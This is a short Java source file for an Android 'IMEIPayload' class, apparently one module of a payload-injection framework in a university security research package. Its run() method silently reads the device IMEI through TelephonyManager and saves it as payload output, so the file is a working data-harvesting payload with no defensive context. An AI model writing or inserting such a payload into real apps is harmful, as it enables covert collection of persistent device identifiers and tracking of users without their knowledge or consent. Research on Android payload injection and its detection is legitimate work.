package it.unisannio.srss.dame.android.payloads.imei;

import it.unisannio.srss.dame.android.payloads.Payload;
import android.content.Context;
import android.telephony.TelephonyManager;
import android.util.Log;

public class IMEIPayload extends Payload {

	public IMEIPayload(){
		super();
	}
	
	public IMEIPayload(Context context) {
		super(context);
	}

	@Override
	public synchronized void run() {
		TelephonyManager tm = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String imei = tm.getDeviceId();
		if (save(imei))
			Log.i(tag, "IMEI saved successful");
		else
			Log.e(tag, "Error while saving the payload output.");

	}
}
